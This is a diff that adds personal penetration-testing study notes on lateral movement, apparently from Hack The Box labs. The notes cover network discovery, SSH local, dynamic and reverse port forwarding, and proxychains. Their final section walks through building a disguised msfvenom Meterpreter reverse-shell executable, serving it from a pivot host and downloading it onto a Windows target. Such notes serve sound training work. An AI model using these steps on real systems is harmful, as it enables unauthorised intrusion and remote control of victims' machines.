@@ -1,0 +1,76 @@
+
+# lateral movement
+
+- every device on the network has an ip address
+- static ip addresses are usually 
+    - Servers
+    - Routers
+    - Switch virtual interfaces
+    - Printers
+    - And any devices that are providing critical services to the network
+- networking 
+    - linux `ifconfig`
+        - `tun0` vpn connection (usually its us via htb)
+        - if the ip address is pubically accessible is could mean it inside a dmz (aka over the internet)
+            - eg `134.122.100.200`
+        - `inet 192.168.111.128 netmask 255.255.255.0 broadcast 192.168.111.255`
+            - `inet [ipv4 address] netmask [subnet mask] broadcast [default gateway]` 
+    - windows `ipconfig`
+        - `IPv4 Address. . . . . . . . . . . : 192.168.111.129`     your ip
+        - `Subnet Mask . . . . . . . . . . . : 255.255.255.0`       everything on your network - subnet calculator
+        - `Default Gateway . . . . . . . . . : 192.168.111.2`       everything not on your network (internet)
+- routing
+    - read in reverse; default is the last entry
+    - Which networks you already have routes to (directly connected or static).
+    - Which networks are missing—where you might need to add a new static route or create a tunnel. 
+    - linux `netstat -r`
+    - windows `route print`
+    - 
+- local port forward
+    - msql hosted locally on $ip
+        - setup local port forward on port 1234 and send all traffic to $ip address
+        - `ssh -L 1234:localhost:3306 victim@$ip`
+            - You’re connecting to $ip via SSH using the victim account.
+            - SSH sets up a local port on your own system, at `localhost|127.0.0.1:1234`
+            - Anything you send to your `localhost|127.0.0.1:1234` is encrypted and forwarded through the SSH tunnel. 
+            - On the remote machine, that traffic is forwarded to `localhost:3306` — from the remote machine's point of view. 
+        - `netstat -antp | grep 1234`
+            - verify
+        - `mysql -h 127.0.0.1 -P 1234 -u username -p`
+            - connect to mysql on 127.0.0.1 on port 1234 which travels over encrypted ssh to $ip and from there to `localhost:3306`
+    - set up multiple ports (1234->3306 && 8080->80)
+        - `ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@$ip`
+- dynamic port forward
+    - SOCKS (socket secure) proxy
+    - creates a proxy for all traffic between your device and the target
+    - can be local OR another host
+    - socks4
+        - check bottom of `/etc/proxychains.conf`
+            - `socks4 	127.0.0.1 9050`   
+        - `ssh -D 9050 ubuntu@$ip`     create dynamic port forwarding on port 9050
+        - proxychains
+            - `proxychains nmap -v -sn 172.16.5.1-200`
+                - run nmap as if we were on $ip
+            - `proxychains nmap -v -Pn -sT 172.16.5.19`
+    - `proxychains msfconsole` can also be used with metasploit
+    - `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`   rdp connection
+- reverse port forward
+    - we have access to a machine but cannot get tools to it directly. 
+    - We find a machine that can access our attacker machine and the windows machine. 
+    - We build an exe which we copy to the middle machine and setup python server. 
+    - The windows machine then iex the exe and executes it causing a msfconsole connection.
+    - ssh
+        - create msfvenom package
+            - `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`
+        - run msfconsole
+            - `use exploit/multi/handler`
+            - set the value for LHOST when using the multi/handler module of msfconsole to 0.0.0.0 will ensure that the handler is listening on all IP addresses assigned to the host
+        - transfer payload to pivot host
+            - `scp backupscript.exe ubuntu@<ipAddressofTarget>`
+        - start http server on pivot host `python3 -m http.server 8123`
+        - on windows host
+            - download exe
+                - `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
+        - ssh
+            - `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
+        - 
